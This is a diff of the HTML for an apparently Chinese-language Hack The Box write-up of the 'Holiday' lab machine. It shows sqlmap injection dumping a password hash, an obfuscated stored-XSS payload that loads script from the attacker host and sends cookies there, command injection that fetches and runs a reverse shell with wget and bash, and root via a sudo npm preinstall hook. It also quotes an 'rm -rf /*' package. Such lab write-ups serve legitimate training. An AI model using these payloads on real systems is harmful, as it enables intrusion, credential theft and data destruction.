@@ -148,7 +148,7 @@
 
   
     <div class="author__avatar">
-      <a href="https://yueyejian13.github.io">
+      <a>
         <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
       </a>
     </div>
@@ -156,7 +156,7 @@
 
   <div class="author__content">
     <h3 class="author__name p-name" itemprop="name">
-      <a class="u-url" rel="me" href="https://yueyejian13.github.io" itemprop="url">yueyejian</a>
+      <a>yueyejian</a>
     </h3>
     
       <div class="author__bio p-note" itemprop="description">
@@ -365,71 +365,71 @@ OS and Service detection performed. Please report any incorrect results at https
 
 <p>把数据包丢进sqlmap里面跑，但是不加参数跑不出来，需要加上level和risk</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5
-=================================================================================================================
-POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
-sqlmap identified the following injection point(s) with a total of 474 HTTP(s) requests:
----
-Parameter: username (POST)
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py <span class="nt">-r</span> 1.txt <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--threads</span><span class="o">=</span>5
+<span class="o">=================================================================================================================</span>
+POST parameter <span class="s1">'username'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] n
+sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 474 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+<span class="nt">---</span>
+Parameter: username <span class="o">(</span>POST<span class="o">)</span>
     Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
-    Payload: username=admin") OR NOT 8580=8580 AND ("MLnl"="MLnl&amp;password=admin
+    Title: OR boolean-based blind - WHERE or HAVING clause <span class="o">(</span>NOT<span class="o">)</span>
+    Payload: <span class="nv">username</span><span class="o">=</span>admin<span class="s2">") OR NOT 8580=8580 AND ("</span>MLnl<span class="s2">"="</span>MLnl&amp;password<span class="o">=</span>admin
 
     Type: time-based blind
-    Title: SQLite &gt; 2.0 OR time-based blind (heavy query)
-    Payload: username=admin") OR 3510=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ("YPRb"="
-YPRb&amp;password=admin
----
-[08:32:00] [INFO] the back-end DBMS is SQLite
+    Title: SQLite <span class="o">&gt;</span> 2.0 OR time-based blind <span class="o">(</span>heavy query<span class="o">)</span>
+    Payload: <span class="nv">username</span><span class="o">=</span>admin<span class="s2">") OR 3510=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND ("</span>YPRb<span class="s2">"="</span>
+YPRb&amp;password<span class="o">=</span>admin
+<span class="nt">---</span>
+<span class="o">[</span>08:32:00] <span class="o">[</span>INFO] the back-end DBMS is SQLite
 web application technology: Express
 back-end DBMS: SQLite
 </code></pre></div></div>
 
 <p>查看表</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5 --tables
-================================================================================
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py <span class="nt">-r</span> 1.txt <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--threads</span><span class="o">=</span>5 <span class="nt">--tables</span>
+<span class="o">================================================================================</span>
 &lt;current&gt;
-[5 tables]
+<span class="o">[</span>5 tables]
 +-----------------+
 | bookings        |
 | notes           |
 | sessions        |
 | sqlite_sequence |
-| users           |
+| <span class="nb">users</span>           |
 +-----------------+
 </code></pre></div></div>
 <p>查看user表中的数据，得到账号 RickA和密码的md5，解密后得到密码</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python27 sqlmap.py -r 1.txt --level=5 --risk=3 --threads=5 -T users --dump
-===========================================================================================================================
-[08:38:00] [INFO] retrieved: 103
-[08:39:13] [INFO] retrieved: CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,active
- TINYINT(1))
-[08:39:13] [INFO] fetching entries for table 'users'
-[08:39:13] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
-[08:39:13] [INFO] retrieved: 1
-[08:39:14] [INFO] retrieving the length of query output
-[08:39:14] [INFO] retrieved: 1
-[08:39:16] [INFO] retrieved: 1
-[08:39:19] [INFO] retrieving the length of query output
-[08:39:19] [INFO] retrieved: 1
-[08:39:20] [INFO] retrieved: 1
-[08:39:23] [INFO] retrieving the length of query output
-[08:39:23] [INFO] retrieved: 32
-[08:39:49] [INFO] retrieved: fdc8cd4cff2c19e0d1022e78481ddf36
-[08:39:49] [INFO] retrieving the length of query output
-[08:39:49] [INFO] retrieved: 5
-[08:39:55] [INFO] retrieved: RickA
-[08:39:55] [INFO] recognized possible password hashes in column 'password'
-do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
-do you want to crack them via a dictionary-based attack? [Y/n/q] n
-Database: &lt;current&gt;
-Table: users
-[1 entry]
-+----+--------+----------+----------------------------------+
-| id | active | username | password                         |
-+----+--------+----------+----------------------------------+
-| 1  | 1      | RickA    | fdc8cd4cff2c19e0d1022e78481ddf36 |
-+----+--------+----------+----------------------------------+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python27</span> <span class="n">sqlmap</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">r</span> <span class="mf">1.</span><span class="n">txt</span> <span class="o">--</span><span class="n">level</span><span class="o">=</span><span class="mi">5</span> <span class="o">--</span><span class="n">risk</span><span class="o">=</span><span class="mi">3</span> <span class="o">--</span><span class="n">threads</span><span class="o">=</span><span class="mi">5</span> <span class="o">-</span><span class="n">T</span> <span class="n">users</span> <span class="o">--</span><span class="n">dump</span>
+<span class="o">===========================================================================================================================</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">103</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">CREATE</span> <span class="n">TABLE</span> <span class="nf">users </span><span class="p">(</span><span class="nb">id</span> <span class="n">INTEGER</span> <span class="n">PRIMARY</span> <span class="n">KEY</span> <span class="n">AUTOINCREMENT</span><span class="p">,</span><span class="n">username</span> <span class="n">TEXT</span><span class="p">,</span><span class="n">password</span> <span class="n">TEXT</span><span class="p">,</span><span class="n">active</span>
+ <span class="nc">TINYINT</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">table</span> <span class="sh">'</span><span class="s">users</span><span class="sh">'</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">number</span> <span class="n">of</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">table</span> <span class="sh">'</span><span class="s">users</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">database</span> <span class="sh">'</span><span class="s">SQLite_masterdb</span><span class="sh">'</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="n">length</span> <span class="n">of</span> <span class="n">query</span> <span class="n">output</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">19</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="n">length</span> <span class="n">of</span> <span class="n">query</span> <span class="n">output</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">19</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">20</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="n">length</span> <span class="n">of</span> <span class="n">query</span> <span class="n">output</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">32</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">fdc8cd4cff2c19e0d1022e78481ddf36</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="n">length</span> <span class="n">of</span> <span class="n">query</span> <span class="n">output</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">49</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">5</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">RickA</span>
+<span class="p">[</span><span class="mi">08</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">recognized</span> <span class="n">possible</span> <span class="n">password</span> <span class="n">hashes</span> <span class="ow">in</span> <span class="n">column</span> <span class="sh">'</span><span class="s">password</span><span class="sh">'</span>
+<span class="n">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">store</span> <span class="n">hashes</span> <span class="n">to</span> <span class="n">a</span> <span class="n">temporary</span> <span class="nb">file</span> <span class="k">for</span> <span class="n">eventual</span> <span class="n">further</span> <span class="n">processing</span> <span class="k">with</span> <span class="n">other</span> <span class="n">tools</span> <span class="p">[</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">]</span> <span class="n">n</span>
+<span class="n">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">crack</span> <span class="n">them</span> <span class="n">via</span> <span class="n">a</span> <span class="n">dictionary</span><span class="o">-</span><span class="n">based</span> <span class="n">attack</span><span class="err">?</span> <span class="p">[</span><span class="n">Y</span><span class="o">/</span><span class="n">n</span><span class="o">/</span><span class="n">q</span><span class="p">]</span> <span class="n">n</span>
+<span class="n">Database</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">current</span><span class="o">&gt;</span>
+<span class="n">Table</span><span class="p">:</span> <span class="n">users</span>
+<span class="p">[</span><span class="mi">1</span> <span class="n">entry</span><span class="p">]</span>
+<span class="o">+----+--------+----------+----------------------------------+</span>
+<span class="o">|</span> <span class="nb">id</span> <span class="o">|</span> <span class="n">active</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+----+--------+----------+----------------------------------+</span>
+<span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="mi">1</span>      <span class="o">|</span> <span class="n">RickA</span>    <span class="o">|</span> <span class="n">fdc8cd4cff2c19e0d1022e78481ddf36</span> <span class="o">|</span>
+<span class="o">+----+--------+----------+----------------------------------+</span>
 </code></pre></div></div>
 
 <h2 id="储存型xss">储存型XSS</h2>
@@ -455,13 +455,13 @@ Table: users
 <p>其中的CHARCODE_HERE由<code class="language-plaintext highlighter-rouge">document.write('&lt;script src="http://10.10.14.2/yyj.js"&gt;&lt;/script&gt;');</code>转化成CharCode得到</p>
 
 <p>python代码如下：</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; payload='''document.write('&lt;script src="http://10.10.14.2/yyj.js"&gt;&lt;/script&gt;');'''
-&gt;&gt;&gt; ','.join([str(ord(c)) for c in payload])
-'100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,1
-12,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59'
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">payload</span><span class="o">=</span><span class="sh">'''</span><span class="s">document.write(</span><span class="sh">'</span><span class="s">&lt;script src=</span><span class="sh">"</span><span class="s">http://10.10.14.2/yyj.js</span><span class="sh">"</span><span class="s">&gt;&lt;/script&gt;</span><span class="sh">'</span><span class="s">);</span><span class="sh">'''</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">str</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">])</span>
+<span class="sh">'</span><span class="s">100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,1
+12,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59</span><span class="sh">'</span>
 </code></pre></div></div>
 <p>最后得到的payload：</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img src="x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;"&gt;
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"x/&gt;&lt;script&gt;eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,47,121,121,106,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));&lt;/script&gt;"</span><span class="nt">&gt;</span>
 </code></pre></div></div>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lnvp 80
 listening on [any] 80 ...
@@ -481,9 +481,9 @@ Host: 10.10.14.2
 Serving HTTP on :: port 80 (http://[::]:80/) ...
 </code></pre></div></div>
 <p>yyj.js文件内容：</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window.addEventListener('DOMContentLoaded', function(e) {
-    window.location = "http://10.10.14.2:81/?cookie=" + encodeURI(document.getElementsByName("cookie")[0].value)
-})
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">DOMContentLoaded</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.10.14.2:81/?cookie=</span><span class="dl">"</span> <span class="o">+</span> <span class="nf">encodeURI</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">"</span><span class="s2">cookie</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">)</span>
+<span class="p">})</span>
 </code></pre></div></div>
 <p>然后在监听81端口以及80端口的yyj.js文件可以正常访问的情况下，重新提交最终的payload</p>
 
@@ -508,8 +508,8 @@ Serving HTTP on :: port 80 (http://[::]:80/) ...
 
 <p>经测试，用url编码之后的<code class="language-plaintext highlighter-rouge">&amp;</code>拼接语句可触发命令注入漏洞<code class="language-plaintext highlighter-rouge">/admin/export?table=users%26id</code></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
-1|RickA|fdc8cd4cff2c19e0d1022e78481ddf36|1
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">algernon</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">algernon</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">algernon</span><span class="p">)</span>
+<span class="mi">1</span><span class="o">|</span><span class="n">RickA</span><span class="o">|</span><span class="n">fdc8cd4cff2c19e0d1022e78481ddf36</span><span class="o">|</span><span class="mi">1</span>
 </code></pre></div></div>
 
 <p>现在注入点有了，但是存在白名单限制，怎么去bypass呢？可以先在本机起一个http服务，把反弹shell的脚本挂在上面，然后用wget命令访问十进制或者六进制转换后的ip地址+文件名，再用bash命令执行此文件。</p>
@@ -542,34 +542,34 @@ listening on [any] 2333 ...
 
 <p>并且web服务器也收到信号</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:10.10.10.25 - - [18/Apr/2023 22:05:48] "GET /rev HTTP/1.1" 200 -
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:10.10.10.25 - - <span class="o">[</span>18/Apr/2023 22:05:48] <span class="s2">"GET /rev HTTP/1.1"</span> 200 -
 </code></pre></div></div>
 <p>通过ls命令可以看到rev文件上传成功了，因为网有点卡我多点了几次，所以有重复的文件，但是我们只需要看rev就行了
 <img src="/images/hackthebox/holiday/13.png" alt="" /></p>
 
 <p>访问<code class="language-plaintext highlighter-rouge">/admin/export?table=b%26bash+rev</code>执行反弹shell命令，成功得到了webshell</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lnvp 2333
-listening on [any] 2333 ...
-connect to [10.10.14.2] from (UNKNOWN) [10.10.10.25] 46894
-bash: cannot set terminal process group (1137): Inappropriate ioctl for device
-bash: no job control in this shell
-algernon@holiday:~/app$ whoami
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\1</span>4530&gt;nc <span class="nt">-lnvp</span> 2333
+listening on <span class="o">[</span>any] 2333 ...
+connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.25] 46894
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1137<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+algernon@holiday:~/app<span class="nv">$ </span><span class="nb">whoami
 whoami
-algernon
-algernon@holiday:~/app$
+</span>algernon
+algernon@holiday:~/app<span class="err">$</span>
 </code></pre></div></div>
 
 <p>成功拿到第一个flag</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/app$ cd ..
-cd ..
-algernon@holiday:~$ ls
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/app<span class="nv">$ </span><span class="nb">cd</span> ..
+<span class="nb">cd</span> ..
+algernon@holiday:~<span class="nv">$ </span><span class="nb">ls
 ls
-app
+</span>app
 user.txt
-algernon@holiday:~$ cat user.txt
-cat user.txt
+algernon@holiday:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
 e9451...........................
 </code></pre></div></div>
 
@@ -590,61 +590,61 @@ User algernon may run the following commands on holiday:
 
 <p>谷歌一下npm install dangerous，大概思路是nodejs包是一个叫<code class="language-plaintext highlighter-rouge">package.json</code>的文件，其格式如下：</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
-  "name": "rimrafall",
-  "version": "1.0.0",
-  "description": "rm -rf /* # DO NOT INSTALL THIS",
-  "main": "index.js",
-  "scripts": {
-    "preinstall": "rm -rf /* /.*"
-  },
-  "keywords": [
-    "rimraf",
-    "rmrf"
-  ],
-  "author": "João Jerónimo",
-  "license": "ISC"
-}
-</code></pre></div></div>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rimrafall"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0.0"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rm -rf /* # DO NOT INSTALL THIS"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"main"</span><span class="p">:</span><span class="w"> </span><span class="s2">"index.js"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"scripts"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"preinstall"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rm -rf /* /.*"</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"keywords"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="s2">"rimraf"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"rmrf"</span><span class="w">
+  </span><span class="p">],</span><span class="w">
+  </span><span class="nl">"author"</span><span class="p">:</span><span class="w"> </span><span class="s2">"João Jerónimo"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"license"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ISC"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
 <p>其中<code class="language-plaintext highlighter-rouge">preinstall</code>中的预安装命令会在安装这个包之前执行。这也是为什么npm install存在危险。在这台靶机中我们需要创建一个文件夹，再创建一个<code class="language-plaintext highlighter-rouge">package.json</code>来模拟nodejs应用，node包中需要有name和version这两个参数：</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj$ cat package.json
-cat package.json
-{
-  "name": "root_please",
-  "version": "1.0.0",
-  "scripts": {
-    "preinstall": "/bin/bash"
-  }
-}
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj<span class="nv">$ </span><span class="nb">cat </span>package.json
+<span class="nb">cat </span>package.json
+<span class="o">{</span>
+  <span class="s2">"name"</span>: <span class="s2">"root_please"</span>,
+  <span class="s2">"version"</span>: <span class="s2">"1.0.0"</span>,
+  <span class="s2">"scripts"</span>: <span class="o">{</span>
+    <span class="s2">"preinstall"</span>: <span class="s2">"/bin/bash"</span>
+  <span class="o">}</span>
+<span class="o">}</span>
 </code></pre></div></div>
 <p>在package.json的上一级目录yyj执行<code class="language-plaintext highlighter-rouge">sudo npm i yyj/ --unsafe</code>就能获取root权限了，随后拿到root权限下的flag</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj$ cd ..
-cd ..
-algernon@holiday:~$ ls
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>algernon@holiday:~/yyj<span class="nv">$ </span><span class="nb">cd</span> ..
+<span class="nb">cd</span> ..
+algernon@holiday:~<span class="nv">$ </span><span class="nb">ls
 ls
-app
+</span>app
 node_modules
 user.txt
 yyj
-algernon@holiday:~$ sudo npm i yyj/ --unsafe
-sudo npm i yyj/ --unsafe
+algernon@holiday:~<span class="nv">$ </span><span class="nb">sudo </span>npm i yyj/ <span class="nt">--unsafe</span>
+<span class="nb">sudo </span>npm i yyj/ <span class="nt">--unsafe</span>
 
-&gt; root_please@1.0.0 preinstall /home/algernon/node_modules/.staging/root_please-f4b1cb59
-&gt; /bin/bash
+<span class="o">&gt;</span> root_please@1.0.0 preinstall /home/algernon/node_modules/.staging/root_please-f4b1cb59
+<span class="o">&gt;</span> /bin/bash
 
+<span class="nb">ls
+</span>package.json
+<span class="nb">whoami
+</span>root
+python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+root@holiday:~/node_modules/.staging/root_please-f4b1cb59# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+root@holiday:/root# <span class="nb">ls
 ls
-package.json
-whoami
-root
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-root@holiday:~/node_modules/.staging/root_please-f4b1cb59# cd /root
-cd /root
-root@holiday:/root# ls
-ls
-root.txt
-root@holiday:/root# cat root.txt
-cat root.txt
+</span>root.txt
+root@holiday:/root# <span class="nb">cat </span>root.txt
+<span class="nb">cat </span>root.txt
 592d9c91924793c4c8b8ed..........
 </code></pre></div></div>
 <h2 id="小结">小结</h2>
